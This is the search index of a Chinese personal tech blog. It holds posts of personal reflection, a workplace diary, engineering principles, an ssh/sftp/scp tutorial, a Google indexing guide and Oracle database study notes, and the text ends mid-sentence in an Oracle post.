[{"content":"\r雨后，在太阳宫的旁边漫步，夕阳映射下的玄武湖泛着粉紫色的梦幻光芒，对岸的紫峰大厦刚刚亮起灿灿星火。\n五年前也是一个这样的夜晚，高二的我初到南京旅游，一时兴起绕着玄武湖夜跑，在同样的位置驻足。那个时候我还可以随意奔跑，心中也怀着凌云壮志。\n犹豫了片刻，我拿出手机给许久未联系的zc拍下了这景色——正如我像当年做的一样。我告诉她兜兜转转我又回到了南京这座城市，同时也知道了她即将踏上赴日留学的旅程。\n在那一刻，我知道，我的青春结束了。\n定格在那湖边落日的霞云中，夏夜晚风的清凉里。\n","date":"2024-06-29T19:31:35+08:00","image":"https://proben1.github.io/2024/%E5%85%AD%E6%9C%88%E4%BA%8C%E5%8D%81%E4%B9%9D%E6%97%A5%E6%99%9A/index_hu355cd1ffd98197a463438d175fafc20c_3203579_120x120_fill_q75_box_smart1.jpg","permalink":"https://proben1.github.io/2024/%E5%85%AD%E6%9C%88%E4%BA%8C%E5%8D%81%E4%B9%9D%E6%97%A5%E6%99%9A/","title":"六月二十九日晚"},{"content":"作为部门的一员，一名工程师如果只有技术上的属性，那么他只能算合格；一名优秀的工程师，需要同时兼顾技术能力与团队沟通，正如描述所言：独行快，众行远。\n下面是我认为在工作和学习中需要遵循的原则，当遇事犹豫之时，可依此为指导，方能不忘初心。\n初心 成长。\n大一我曾对自己说，每一次成长，都来源于直面和解决问题，而不是否定和逃避。现在，我将这句话继续下去：\n面对问题，深究根本原因，直至找到通往出口的钥匙。\n技术 深究精神 遇到问题以实践为标准，为什么会出现这样的结果？需要事后的思考和总结。\n把一个问题分子化\n就举一个最最入门的例子吧，刚学Linux命令的时候，为什么cd叫cd，du叫du，这些命令后面是有具体英文含义的，不是死记硬背的出来的，比如cd（change directory）、du（disk usage）、甚至du里的-s（summary）都是有含义的。\n一层一层向下提问。\n把一个问题模块化\n再比如，装系统的时候踩过的坑，Linux8.6图形界面配置网络之后无法更改，最后发现是network和NetworkManager冲突的问题，同时得出结论在使用操作系统时有良好的操作习惯，在配置网络尽量用命令行。从一个小问题引申出来的技术点和之后的规避。\n就是这样遇到了什么？怎么尝试解决的？最后的总结是什么？三段式。\n一定要去把零碎接收到的知识梳理出来。我们不可能总是遇到好导师，你需要自己做自己的导师。\n质疑精神 不是所有问题都只有一个答案，不是所有场景都只有一种解决方案。从不同角度分析问题，提出新的解决方案或是企图找到更好的方案。\n同事或者领导并不一定完全是对的，他们的经验和观点十分宝贵，但也可能存在局限性。你需要保持独立思考的能力，多去尝试，遇到问题以实践为标准。\n分享精神 好好写笔记，第一遍笔记是自己一手输出的随笔，有很强的时效性（包括当时的记忆），但缺乏整理，只有自己在记完的那一段时间里可以看得懂。需要养成整理笔记的良好习惯，不单单是对自己负责，还可以输出给别人理解学习，在历史上留下浓墨重彩的一笔（不是）。\n安全红线 生产环境操作要三思。\n当你拿不准操作是否有问题的时候，问一下，走流程，就算最后还是出现问题，那也不是个人的问题。\n生产环境操作要提MOP！\n首先不能敲危险命令（rm -f、mkfs之类的），其次不能敲类危险命令。甚么是类危险命令呢(O_o)??\n就是长得像危险命令的命令，比如一些命令，对目录操作没问题，但是假如在/test的“/”和\u0026quot;test\u0026quot;之间不小心按了个空格，命令就会直接对根目录生效，导致严重的后果。（举个通俗的例子，\u0026gt;\u0026gt;打成\u0026gt;）\n团队 汇报 凡是有交代，件件有着落，事事有回音。——致靠谱的人\n多交流，多沟通，多汇报。这不单是对自己负责，更是对团队负责。我的建议是当你拿不准要不要汇报的时候，就要汇报一下，不要不作为。\n作为技术人员，技术上有不懂的地方很正常，可以学习，可以提升。但是汇报的态度是工作的基本。遇到了什么困难，要进行交代，不要不好意思；有什么发现，及时沟通，不要私下处理。有沟通的团队才能良好的运作下去。\n沟通 其实还是强调了汇报的重要性，不过这里我单独提一嘴，关于需要休息时间打扰别人的问题。 先说结论：在你有任务需求的情况下，正常休息日打扰别人是完全合理的，不要觉得不好意思。\n实习期间发生的一件事，直属领导要求周末完成对服务器的安装，但是机房的负责人在周末休息，并表示周三之前完成安装就可以。 我们当时因为没有钥匙进不去机房，就没有在周末打扰机房的负责人开门，同时也没有告知领导，等着周一去处理这件事情。 这就是一种完全错误的方法。正确的做法应该直接联系机房负责人（他回不回消息就是他的事情了），随后把结果告知直属领导，等待下一步指示。 出差 技术过硬！\n自信！\n找点乐子！\n以及抱着和客户快乐交流的基本原则。\n结语 个人的成长过程是贯穿始终的，是以年为单位的，而且会一直持续数十年。每位工程师的学习方法、工作方法、学习态度等等，都要经历数十年的考验，谨记。\n","date":"2024-05-21T17:55:29+08:00","permalink":"https://proben1.github.io/2024/%E6%8A%80%E6%9C%AF%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%9B%A2%E9%98%9F%E6%88%90%E9%95%BF/","title":"技术学习与团队成长"},{"content":"茄科生物观察手册2024.7\n毕业的第一个月，好的开始是成功的开始。\n7.25\n爽，凌晨操作，明天不用去公司，直接居家办公。\n如果人生是一场旅途，那么钱和社会地位是什么？\n车票？不行，旅途并非有什么目的，车票目的性太强了。\n旅行经费？不行，我不允许你把这么理想的事情说得这么现实[流泪][流泪]\n身上的装备？既符合钱和社会地位的状态性，又能限制你去一些地方，又不影响你欣赏其他景色。\n7.24\n你怎么知道天翔哥连续三天赞了我的日报，十分开心~~~\n开始投入工作之后，我发现我的行事方式有了很大的改变。比如今天pdd退货，因为体积超了，快递要额外收费，pdd只退款了首重的运费。以往遇到这种事情，我会先是很气，然后很气，然后再很气，pdd卸了吧。今天我却没有，脑海中想了两套方案：一是交钱退货，然后想办法能不能把这额外的钱再找平台要回来（已经做好要不回来的打算了）。二是换成上门取货试一下，可能会免费。想了一下还是选了方案一，因为实在有点累而且不一定有时间等他上门。付款之后联系商家客服，平台客服，还是不行，并上网搜了一下原因。遂在心中拉黑商家并下载了1688待用。一套下来，我真的惊讶于我的改变，几天的时间，让我看到了改变20年养成的习惯的希望。\n所以，我愈加感觉到，一切都是可以学习的，不光是技术，还有性格，习惯，外向程度，只要我愿意，并处在合适的环境下。\n瑞幸的陨石咖啡好好喝，特别是不含任何陨石成分笑死我了。才发现每周9.9可以折扣买咖啡，舒服。\n7.22\n。。。班味\n堂堂新时代中国特色社会主义好青年怎么能染上班味？？？\n换了个很红的钉钉头像，叫劳动气息！\n瑞幸12块的抹茶柠檬水喝起来和蜜雪冰城4块的柠檬水没差别啊~\n7.20-7.21\nSuperhot，夏天真的不敢city walk了，37°的天，热崩溃了\n周六去奥匹游了个泳，比大连市游泳馆贵但是整体环境好，水质可能略微刺激一点，但比南京里其他的健身房小馆子好多了。吃了一顿汉堡王的大嘴安格斯：鸡豆腐史诗级难吃；汉堡很大很满足，但是太干了；薯条还好；整体评价一般。\n周天：宜家，七分钟吃完瑞典肉丸+意大利面；打卡小说里的梅花山庄+月牙湖；金陵正春园鸭血粉丝，good\n7.19\n​\t两个半月的必修培训结束了，虽然中间经过了毕业答辩和预装，但整体节奏还是很快的，尤其是最后这两周时间，环环相扣。\n​\t同时，新的“培训”也已经开始了，我要开始学习如何支持项目，如何高效地确定需求并解决问题。我认为这些的难度不亚于必修培训，甚至还包含技术之外的很多东西。但我相信这些是可以学习的。\n​\t那么我将这作为短期目标，现在中期和短期目标都明确了，长期目标还需要再摸索。\n7.18\n搁公司睡一晚，晚上睡公司可以省四块的车费和四块的电费，总计1$\n拯救了一只失足大甲虫（真不是屎壳郎）\n笑死，半夜一区的紧急电话打到二区的负责人手里，然后叫我帮忙叫一下负责操作的倒霉蛋~我还真就一个电话打通了 。。。仿佛看到了自己的将来\n00后整顿职场之和部门四个p7的交集（我p3）：\nNo1.天翔哥，场景：结业答辩\n你这张胶片（企图攻击），嗯。。。（寻找漏洞），没什么问题（未发现漏洞）\n0.2s后（刷新状态）\n你这个PPT（准备架势），恩。。。（寻找弱点），写的还可以（未发现弱点）\n0.2s后（刷新CD）\n你这个布局，恩。。。\n。。。\n（循环）\nNo2.旺总\n前天，七点半出发上班，公交车遇到旺总，不敢认，一块走到食堂，回部门，哇就是他。\n昨天，换了个时间点，八点半出发上班，公交车遇到旺总，就是他，太尴尬了假装没看到，一块走到食堂，回部门。\n今天，旺总来找我了，“公交车上是不是你小子”\nNo3.二爷\n聊天记录只有无数次同样的对话：\n我：“二爷好，求一下xxx项目的动态验证码~”\n二爷：“xxxxxx”\n我：“谢谢！”\nNo4.王爷\n人很和善，刚刚回来拿东西还看到我在加班打游戏。\n7.17\n结业答辩，终于拿出了一个天翔哥满意的ppt！\n仿佛进了赛博流水线，负责500+服务器巡检结果的check，还是，抬头之时已是下班之点！\n7.16\n高可用考试和Oracle考试，以及被环境问题拿下的考生和考官，同样，抬头之时已是下班之点。\n7.15\n支持项目，处理云盘挂载问题，抬头之时已是下班之点。\n坑死我了，就好像是剧本杀，过程无比复杂，结局笑掉大牙。tm最大的问题是hosts里的IP和域名写反了。什么人啊~\n7.14\n。。。写了一天LLD\n7.13\n周六，入职活动还是到单位里去了，认识新同学，有佬！\n7.12\n入职活动，难忘的经历。第一次体验组织者这个角色。共同和16人的小队，完成队名口号旗帜的指定，取得球赛第三的成绩；共同和44名同学在8秒内报数至60，在大家的共同努力下达成了6秒28的佳绩。顺便做了俯卧撑10+20+40+80个。\n晚饭时候我确实拿不起来筷子，因为哥一直用勺子吃。\n7.9\n啊啊啊好多知识，脑子塞不下了，崩溃。\n学长高频率请吃饭，这次又请我吃了pizza。等我转正了一定要请回来！\n7.7\n周六周天为了生活一共花了520，感叹生活不易，鼠鼠崩溃。\n四处找游泳馆，没找到满意的，下次去建邺奥匹看看。为什么南京的游泳馆都是上午12点之后才开门啊~\n7.2\n我！\n毕！\n业！\n了！\n事2：\n学长去年毕业来的公司，23届优秀员工，晚上请我吃了顿烧烤。我俩谈论了一些话题，中间有一部分是关于我现在实习成绩的，建议我好好搞，保持我现在的成绩。晚上正好有时间，思索一下相关的事情。\n客观上讲，我现在实习成绩上保持领先，接下来需要好好保持。\n主观上讲，在学校的经历让我产生了一定程度的习得性无助，对于部门里这种干净的氛围有点受宠若惊，努力在这里是可以得到回报的。同时我认为，部门里的大家都是很有能力的人，想要在其中突出就需要努力+细节。但是从来没想过什么“争第一”这种事情，我的想法很简单，只是担心试用期别给我淘汰了，入职之后别给我优化了。。。。。。\n所以，最后我得出了结论：不去特意把自己放在“第一”的位置上，因为保持这种心态对我自己的伤害比较大。我要做的只是保持本心，干好自己的事情，将一个良好的责任感。\n","date":"2024-08-08T09:39:04+08:00","permalink":"https://proben1.github.io/2024/%E8%8C%84%E7%A7%91%E7%94%9F%E7%89%A9%E8%A7%82%E6%B5%8B%E6%97%A5%E5%BF%972024.7/","title":"茄科生物观测日志2024.7"},{"content":"免密配置 端口转发 sshpass ","date":"2024-07-27T16:21:01+08:00","permalink":"https://proben1.github.io/2024/ssh%E8%BF%9B%E9%98%B6/","title":"Ssh进阶"},{"content":"","date":"2024-07-27T16:02:51+08:00","permalink":"https://proben1.github.io/2024/spine-leaf%E6%9E%B6%E6%9E%84/","title":"Spine Leaf架构"},{"content":"","date":"2024-07-27T16:02:07+08:00","permalink":"https://proben1.github.io/2024/%E9%93%BE%E8%B7%AF%E8%81%9A%E5%90%88%E5%A0%86%E5%8F%A0vrrpm-lag%E7%9A%84%E5%8C%BA%E5%88%86/","title":"链路聚合、堆叠、VRRP、M LAG的区分"},{"content":"","date":"2024-07-27T15:59:23+08:00","permalink":"https://proben1.github.io/2024/oracle%E9%9D%99%E9%BB%98%E5%AE%89%E8%A3%85/","title":"Oracle静默安装"},{"content":"日常中，经常会用到ssh，以及它的好兄弟sftp，或者它的同分异构体scp，还有同素异形体sshpass等等，原理很简单，命令比较绕，所以这里梳理一下。\nSSH SSH (Secure Shell) 是一种用于远程登录和其他网络服务之间的加密协议，ssh 命令用于通过 SSH 协议连接到远程主机，实现远程登录和执行命令，它加密会话中的所有通信，确保数据传输的安全性。\n默认TCP Port 22\nssh [options] [user]@[hostname] [command] 指定端口连接：\nssh -p 2222 user@hostname SFTP SFTP（Secure File Transfer Protocol，安全文件传输协议）是一种基于可靠数据流（data stream），提供文件存取和管理的网络传输协议，与 FTP 协议相比，SFTP 在客户端与服务器间提供了一种更为安全的文件传输方式。\nSFTP 是基于 SSH 协议的，所以也是默认TCP Port 22\nsftp [options] [user]@[hostname]:[remote_folder] 指定端口连接：\nssh -P 2222 user@hostname SFTP 解释器中预置了常用的命令，但是没有自带的 Bash 来得丰富。\n基本指令 ① ls, rm, cd, mkdir, pwd 等指令是对当前连接的远程端服务器的操作。 ② lls, lrm, lcd, lmkdir, lpwd 等指令是对本地端服务器的操作 —— 在上述指令前加l(local)即可 put 本地路径 远程路径 把本地端的文件上传到远程端的目录下\nget 本地路径 远程路径 把远程端的文件下载到本地端的目录下\n如果上传/下载的是文件夹, 在put/get命令后加上-r参数即可。 !command 在本地端上执行command这个命令，比较方便\nexit 退出sftp\nSCP scp 是 secure copy 的缩写, scp 是 linux 系统下基于 ssh 登陆进行安全的远程文件拷贝命令。\n默认TCP Port 22\n对目录操作在scp后面加 -r\n1、从本地复制到远程 命令格式：\nscp [本地文件] [user]@[hostname]:[remote_folder] 或者 scp [本地文件] [user]@[hostname]:[remote_file] 第1,2个指定了用户名，命令执行后需要再输入密码，第1个仅指定了远程的目录，文件名字不变，第2个指定了文件名； 2、从远程复制到本地 从远程复制到本地，只要反过来即可\nscp [user]@[hostname]:[remote_folder] [本地文件] 或者 scp [user]@[hostname]:[remote_file] [本地文件] ","date":"2024-07-27T15:58:11+08:00","permalink":"https://proben1.github.io/2024/ssh%E5%92%8Csftp%E7%9A%84%E4%BD%BF%E7%94%A8/","title":"ssh和sftp的使用"},{"content":"将Hugo博客框架和Github Pages结合起来搭建博客是一种很不错的选择，但是如果仅仅搭建完毕是无法通过搜索引擎查询到的，因为搜索引擎不会去检索你的Github仓库，遇到这个问题怎么办呢？本文教你用Hugo在Github Pages上搭建的博客如何能被Google搜索到。\n查看是否被收录 首先查看你的博客地址是否已经被Google收录，在Google的搜索栏中搜索：\nsite:http://xxxx.github.io 如果没有结果，那么先添加收录\n如果只有主页面，那么添加站点地图\n搜索资源提交 进入Google Search Console:\n在添加资源中，选择网址前缀验证\n选择备用方法中的HTML标记方式来验证\nGoogle会给出一个html的标识，你需要在博客根目录下的static文件夹里创建一个和该html同名的文件夹，并把这个html标识复制到文件夹内，更名为index.html\n更新你的目录，完成验证。\n编制索引 进入Google Search Console 中的网址检查里，对网址完成检查，并点击请求编入索引：\n站点地图 进入Google Search Console 中的站点地图里，添加站点地图，hugo默认的地图是xml格式，直接在后缀添加即可。\n","date":"2024-07-27T15:41:45+08:00","permalink":"https://proben1.github.io/2024/%E8%AE%A9google%E6%90%9C%E7%B4%A2%E5%88%B0%E6%90%AD%E5%BB%BA%E5%9C%A8githubpages%E4%B8%8A%E7%9A%84%E5%8D%9A%E5%AE%A2/","title":"让Google搜索到搭建在GithubPages上的博客"},{"content":"前言 在刚学习Oracle的时候，会接触的一个叫“表空间”的词，很容易被误认为“表”。实际上这是两个完全不同的概念，表空间是Oracle里逻辑存储上最大的单位，”表“是关系型数据库存储和管理数据的一种结构，由行和列组成，每行代表一条记录，每列代表记录中的一个字段。“表”对应Oracle逻辑存储的段，而且只是众多段的一种。\n现在我们看一下，该如何去理解这些概念：实例（Instance）、表空间（Table space）、模式（Schema）、数据库对象、用户（Users）、段（segment）、区（extend）、块（block）、表（table）、列（column）、行（row）\n行、列、表 在关系数据库中，表（Table）是数据的主要组织单元。它是由一组命名的列和行组成，用于存储和组织数据。\n列（Column）是表中的一个字段，用于存储特定类型的数据。每个列都有一个名称和相应的数据类型。例如，一个包含学生信息的表可以有列如\u0026quot;学生编号\u0026quot;、\u0026ldquo;姓名\u0026quot;和\u0026quot;年龄\u0026quot;等，其中每个列分别存储学生的唯一编号、姓名和年龄数据。\n行（Row），也称为记录（Record），是表中的一个实例或一个数据行。每行由一组与该表的列相对应的值组成。例如，在上述的学生信息表中，每一行可以表示一个学生的具体信息，包括学生编号、姓名和年龄。\n简单来说：\n表是一个二维的数据结构，由行和列组成。 列是表中的一个字段，用于定义数据的类型和存储特定数据。 行是表中的一个记录或实例，包含一组值，每个值与相应列对应。\n就像这样：\nEmpId Lastname Firstname Salary 1 Smith Joe 40000 2 Jones Mary 50000 3 Johnson Cathy 44000 块、区、段、表空间 接下来是Oralce逻辑存储上的划分：\n首先我们清空大脑，想象数据库宏观上都要存储哪些东西。\n主要是数据文件和日志文件，是吧。\n接着想象，它们存储在磁盘上，是直接在磁盘上吗？不，数据库要做到管理数据，就必须要划分出一个最小的单元，这个单元就叫做块。块是Oracle数据库中最小的逻辑单元，也是最小的I/O单元。\n块的大小可以是2KB、4KB、8KB（默认）、16KB、32KB等，这些大小必须是倍数增加。\n一个块的结构包括以下几个部分：\n块头（Block Header）：存放块的基本信息，如块的物理地址、块所属的类型（数据段、索引段等）、事务槽（用于记录对块进行事务处理的信息）等。块头的大小不是固定的，但通常占用一定的空间。 表目录（Table Directory）：如果块中存储的数据为表数据，则表目录中保存这个表的相关信息。 行目录（Row Directory）：如果块中存储的数据为表数据，则行目录中保存数据行的相关信息，它是一个指针数组，指示了每一行在数据块中的物理位置。 行数据（Row Data）：真正存放数据的区域，这部分空间已被使用。 空闲空间（Free Space）：未使用的区域，用于新行的插入或者已经存在行的更新。 现在，一些块在物理上连续地在一起，就组成了一个区，区的大小从一个块到2GB不等。\n区的概念很容易理解，当很多相连或者不相连的区组合在一起，就变成了一个段。\n段是Oracle数据库中的分配单位，对象如表、索引等都是以段为单位进行分配。当创建一个表时将创建一个表段，创建一个索引时就创建一个索引段。每一个消耗存储空间的对象最终被存储到一个段中。有回滚段、临时段、聚簇段、索引段等。\n我们上边所说的表，其实就是一个表段，也可以说数据段。毫无疑问，表段是最主要的段，但其他段的作用也不可忽视。\n继续向上延伸，引出表空间的概念：表空间是数据库中存储数据的逻辑容器，可以包含一个或多个数据文件(*.DBF)，DBF文件就可以肉眼（ls命令）看到啦！\n一个段只能属于一个表空间，并且只能存储在该表空间的数据文件中。虽然段属于一个表空间，但它可以跨越该表空间内的多个数据文件（*.DBF）。Oracle数据库会自动管理数据块和区的分配，以便将段分布在多个数据文件中，以提高性能和空间利用率。而一个区只能属于一个数据文件。\n模式、用户 模式是数据库对象的逻辑集合。数据库对象包括表，视图，同义词，约束、索引，序列，游标，触发器，函数，变量，（控制块，异常），存储过程，包。模式中的对象存储在表空间中，一个表空间可以包含多个模式中的对象，而一个模式中的对象也可以分布在多个表空间中。 用户是指拥有数据库访问权限的实体，每个用户都对应一个模式（Schema）。当用户在Oracle数据库中创建时，通常会为其指定一个默认表空间。该表空间将作为用户创建新对象（如表、索引等）时的默认存储位置。 要注意，schema是逻辑对象的集合组织，是一个组织概念，和表空间等逻辑概念不属于一个层面。在oracle中，一个user对应的就是一个schema，二者是强相关的。\n总结 oracle数据库存储的逻辑和物理结构\n","date":"2024-07-04T10:54:43+08:00","permalink":"https://proben1.github.io/2024/oracle%E7%89%A9%E7%90%86%E9%80%BB%E8%BE%91%E5%AD%98%E5%82%A8%E6%A6%82%E5%BF%B5%E5%8C%BA%E5%88%86/","title":"Oracle物理逻辑存储概念区分"},{"content":"自动共享管理内存 ASMM 从 Oracle 10g 开始，Oracle 提供了自动 SGA 的管理（简称 ASMM，Automatic Shared Memory Management）新特性。不再需要手工设置若干内存池的大小，而是为 SGA 设置一个总的大小尺寸即可。\n原理：Oracle 新引入了一个名为 MMAN（Memory Manager）的后台进程。每隔很短的一段时间，MMAN 进程就会启动，然后去询问一下 Oracle 提供的各个内存组件顾问，由这些顾问根据当前的负载情况，将可以自动调整的内存池建议的大小尺寸，返回给 MMAN。\nMEMORY_TARGET 参数定义了整个 SGA 的总容量，不能超过MEMORY_MAX_TARGET。\nstatistics_level 必须设置为 typical 或 all 才能启动ASMM，否则如果设置为 basic，则关闭 ASMM。\n参数大小设置如下：\n关机指令 SHUTDOWN NORMAL（普通关闭）\n如果没有指定任何模式，则默认使用NORMAL模式。 在此模式下，Oracle服务器在完成关闭之前会等待所有用户断开连接。 数据库高速缓冲区缓存和重做日志缓冲区被写入磁盘。 终止后台进程，并从内存中删除SGA（系统全局区）。 在关闭实例之前，Oracle服务器会关闭并卸除数据库。 SHUTDOWN IMMEDIATE（立即关闭）\n使用此命令时，Oracle服务器不等待当前连接到数据库的用户直接断开连接。 Oracle服务器会回滚活动事务并断开所有已连接用户的连接。 在关闭实例之前，Oracle服务器会关闭并卸除数据库。 SHUTDOWN TRANSACTIONAL（事务保证关闭）\n在此模式下关闭可防止客户端丢失数据，包括其当前活动会话的结果。 没有客户端可以在此实例上启动新事务。 当客户端结束正在进行的事务时，客户端将断开连接。 完成所有事务后，将立即关闭。 SHUTDOWN ABORT（强制终止/强制关闭）\n在某些紧急情况下，如果其他关闭模式均无效，可以使用此命令。 Oracle服务器正在处理的当前SQL语句将立即终止。 Oracle服务器不等待当前连接到数据库的用户直接断开连接。 数据库高速缓冲区缓存和重做缓冲区未写入磁盘。 未提交的事务不会回滚。 该实例将终止而不关闭文件。 数据库未关闭或卸载 scope参数 SCOPE参数在Oracle数据库中用于控制ALTER SYSTEM命令对数据库参数修改的生效范围和时机，总共有三个值：BOTH、MEMORY，SPFILE。\nMEMORY：仅对当前实例的内存中的参数值进行修改，不改变服务器参数文件（SPFILE）中的值，修改立即生效，但只持续到数据库实例关闭。 SPFILE：仅对服务器参数文件（SPFILE）中的参数值进行修改，不改变当前实例的内存中的值。修改不会立即生效，而是在数据库实例下一次启动时生效。 BOTH：同时修改当前实例的内存中的参数值和服务器参数文件（SPFILE）中的值。修改立即生效（针对内存中的值），并且在数据库实例下一次启动时仍然有效（因为SPFILE中的值也被修改了）。 ASM实现高可用的方式 ASM（Automatic Storage Management，自动存储管理）是Oracle推荐的一种智能化数据库文件存储管理方式，它通过自动管理磁盘组来平衡I/O负载，提高数据的可靠性和可用性。\nASM提供三种镜像类型来实现数据冗余：\n外部冗余（External Redundancy）：没有镜像的一种冗余方式，即在磁盘组中没有故障组。这种方式下，Oracle不管理镜像，镜像功能由外部存储系统实现（如RAID技术）。 常规冗余（Normal Redundancy）：要求磁盘组具有两个故障组，每个故障组一个磁盘控制器。这种方式下，Oracle提供两份镜像来保护数据，有效磁盘空间是所有磁盘设备大小之和的1/2。 高冗余（High Redundancy）：要求磁盘组具有三个故障组，每个故障组一个磁盘控制器。这种方式下，Oracle提供三份镜像来保护数据，以提高性能和数据的安全性。有效磁盘空间是所有磁盘设备大小之和的1/3。 block_size对应最大的表空间大小 Oracle的Rowid使用22位来代表数据块号，因此Oracle表空间数据文件每个数据文件最多只能包含2^22个数据块。 也因此数据库表空间的数据文件不是无限增长的，例如：\n登DBA用户，查询当前ORACEL数据库数据库的大小：\nSQL\u0026gt; select name,value from v$parameter where name = \u0026#39;db_block_size\u0026#39;; NAME VALUE ------------------------------ -------------------- db_block_size 8192 在数据块为8k的情况下，单个数据文件的最大容量为8K*2^22 = 32G。\n因此，有的表空间扩容不能直接resize，需要去添加新的数据文件到表空间中，例如：\nALTER TABLESPACE TAB_CC ADD DATAFILE '/oradata/test2.dbf' SIZE 10G;\nOracle几种启动状态 1、startup nomount；\n非安装启动，数据库实例已经启动，但并未加载任何数据库文件，因此不能访问数据库中的数据。此阶段通常用于新建数据库、修复控制文件等场景。\n启动实例：数据库实例开始运行，但此时并不加载数据库文件。\n初始化SGA：系统全局区（SGA）被初始化，分配内存结构供实例使用。SGA包括数据库缓冲区缓存、日志缓冲区、共享池等关键内存结构。\n启动后台进程：启动一系列必需的后台进程，如PMON（进程监控器）、SMON（系统监控器）、DBWn（数据库写入器）、LGWR（日志写入器）和CKPT（检查点进程）等，这些进程负责数据库的运行和维护。\n读取初始化文件：读取并解析初始化文件（如init.ora或spfile），该文件包含数据库启动和运行所需的配置参数。\n打开警告日志和跟踪文件：启动过程中，相关的警告日志和跟踪文件被打开，用于记录数据库的运行状态和错误信息。\n2、startup mount (dbname)；\n安装启动，这种模式将启动实例，加载数据库并保持数据库关闭状态。这种方式启动下可执行：数据库日志归档、数据库介质恢复、使数据文件联机或脱机、重新定位数据文件、重做日志文件。\n此时我们可以查看数据字典，因为控制文件已经打开；不能访问数据库的数据文件（表，视图），此时数据文件没有打开。\n改变归档模式\narchive log list; ALTER DATABASE ARCHIVELOG; ALTER DATABASE NOARCHIVELOG; 暂停和重开数据库\nALTER SYSTEM SUSPEND; ALTER SYSTEM RESUME; （接上）\n打开控制文件：控制文件是Oracle数据库的关键文件之一，它包含了数据库的物理结构信息，如数据文件、重做日志文件的位置和状态等。在MOUNT阶段，数据库会打开控制文件，并读取其中的信息，以确认数据文件和联机日志文件的位置和状态。但此时不会对数据文件和日志文件进行实际的读写操作。 准备数据访问：虽然MOUNT阶段不会直接打开数据文件，但数据库会确保控制文件中记录的数据文件和日志文件的位置是有效的，并准备在后续的OPEN阶段中打开这些文件。 记录日志信息：如实例启动的详细信息、控制文件的打开情况等。这些日志信息对于数据库的故障排查和恢复非常重要。 3、startup open (dbname)；\nALTER DATABASE OPEN：从mount或nomount状态切换到open\nSTARTUP：先执行“nomount”，然后执行“mount”，再打开包括Redo log文件在内的所有数据库文件，这种方式下可访问数据库中的数据。\nstartup 等于以下三个命令 startup nomount； alter database mount； alter database open； 查看oracle 启动状态：\nselect status from v$instance； （showdown | nomount | mount | open）\nOracle索引类型 b-tree索引 Oracle数据库中最常见的索引类型是b-tree索引，也就是B-树索引，以其同名的计算科学结构命名。CREATE INDEX语句时，默认就是在创建b-tree索引。没有特别规定可用于任何情况。 位图索引(bitmap index) 位图索引特定于该列只有几个枚举值的情况，比如性别字段，标示字段比如只有0和1的情况。 基于函数的索引 比如经常对某个字段做查询的时候是带函数操作的，那么此时建一个函数索引就有价值了。 分区索引和全局索引 这2个是用于分区表的时候。前者是分区内索引，后者是全表索引 反向索引（REVERSE） 这个索引不常见，但是特定情况特别有效，比如一个varchar(5)位字段(员工编号)含值 （10001,10002,10033,10005,10016..） 这种情况默认索引分布过于密集，不能利用好服务器的并行 但是反向之后10001,20001,33001,50001,61001就有了一个很好的分布，能高效的利用好并行运算。 HASH索引 HASH索引可能是访问数据库中数据的最快方法，但它也有自身的缺点。集群键上不同值的数目必须在创建HASH集群之前就要知道。需要在创建HASH集群的时候指定这个值。使用HASH索引必须要使用HASH集群。 ","date":"2024-07-04T09:44:37+08:00","permalink":"https://proben1.github.io/2024/oracle%E7%BB%86%E8%8A%82%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/","title":"Oracle细节知识整理"},{"content":"前言 在接触Oracle之前，寻思我都用过MySQL了，这玩意搞起来不是轻轻松松？事实上错得离谱啊。“用过”代表只是会一点SQL语句，也就是说我对数据库本身是未知的一个状态。\nMySQL是中小型、小内存的数据库，对于字符串可以使用双引号，并且在windows下大小写不敏感，Linux下敏感。\nOracle是大型、大内存的数据库，对于字符串只可以单引号，普通情况下会将所有小写都转换为大写进行处理。\nOracle服务器 Oracle服务器通常指的是运行Oracle数据库管理系统的硬件和软件环境的总称。它不仅仅是一个数据库管理系统（DBMS），还包括了运行DBMS所需的服务器硬件、操作系统、网络连接等。\n概述：Oracle服务器由Oracle数据库软件、数据库实例、监听器（Listener）、网络服务等部分组成。其中，Oracle数据库软件是核心，是一个具有高性能和高可靠面向对象关系型数据库管理系统（Relational Database Management System，RDBMS），负责数据库的管理和操作；数据库实例是数据库运行时在内存中的表示，包括内存结构和后台进程；监听器则负责监听客户端的连接请求，并将其转发给相应的数据库实例。\n在结构上，Oracle 服务器（Oracle Server）由实例（Instance）和数据库（Database）两大部分构成。实例是一组内存结构和 Oracle 后台进程的集合；数据库在物理上由多个操作系统文件组成，其中主要包括数据文件、控制文件和重做日志文件。\nOracle 服务器=实例+数据库\n实例（Instance） = 内存结构+ 后台进程\n内存结构 = SGA （System Global Area）+ PGA（Program Global Area）\n数据库 = 数据文件 + 控制文件 + 联机重做日志文件\nOracle实例 实例是数据库运行时在内存中的表示，相当于用户和数据库的中间层。一个数据库可以有很多实例，而一个实例在生存周期中只能属于一个数据库。\n实例（Instance） = 内存结构（System Global Area，SGA）+ 后台进程\n内存结构描述的是 Oracle 数据库对内存的使用构成，Oracle 内存结构总称为 SGA 。包括数据库高速缓冲区、重做日志缓冲区和共享池等部分。\n后台进程有 DBWn、CKPT、LGWR、SMON、PMON、ARCn 、RECO等。\nOracle数据库 Oracle 数据库 = 数据文件 + 控制文件 + 联机重做日志文件\n除此之外，还有非数据库文件如参数文件、口令文件、归档日志文件、跟踪文件、警告文件等。\nSGA 数据库高速缓冲区 数据库高速缓冲区的作用就是用来缓存最近从数据库中读出的数据块，并可供其他客户进程共享。用户进程查看数据时，首先检查需要的信息是否在缓冲区内，如果在缓冲区中，就可以直接访问，否则访问物理文件并读取数据块到数据库缓冲区。\n根据缓冲数据块的状态，Oracle 将数据高速缓冲区可划分成：\n脏缓冲区（Dirty Buffer）：当数据库发生 DML（Insert、Update、Delete）操作时，会对缓冲区内容进行修改，这样缓冲区的内容就会和相对应的数据文件不一致，这时，缓冲区标识为“脏缓冲区”。 自由缓冲区（Free Buffer）：当“脏缓冲区”的内容被写入数据文件后，因为该缓冲区与相应数据文件部分内容一致，所以将这些缓冲区称为“自由缓冲区”。 忙缓冲区（Pinned Buffer）：指服务器进程正在访问的缓冲区。 Oracle 用LRU（Least Recently Used）算法来管理数据高速缓冲区。\n重做日志缓冲区 重做日志缓冲区用来记录对数据缓冲区数据进行的修改。\n当用户运行DML(INSERT、UPDATE、DELETE)以及 DDL(CREATE、ALTER、DROP)语句时，会改变数据高速缓存中的相应缓冲区。但是在修改这些缓冲区之前，Oracle 